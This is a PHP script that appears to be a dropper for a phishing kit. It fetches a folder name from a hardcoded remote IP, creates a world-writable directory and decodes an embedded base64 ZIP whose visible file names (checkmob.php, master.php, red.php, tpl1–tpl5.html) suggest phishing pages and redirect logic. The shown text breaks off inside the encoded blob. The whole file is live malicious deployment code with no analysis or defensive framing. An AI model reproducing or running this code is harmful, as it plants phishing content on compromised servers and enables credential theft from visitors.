<?php

$let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$myfilename = "z1";

$foldername='';     
/*
for ($ns=1;$ns<rand(7,15);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername .= $let[$r];     
} 
*/

	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://135.181.21.126/foldernames.php"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$foldername = curl_exec($ch); 
curl_close($ch);

if (strlen($foldername)<5) $foldername = file_get_contents("http://135.181.21.126/foldernames.php"); 
 
mkdir($foldername, 0777);

$data = base64_decode("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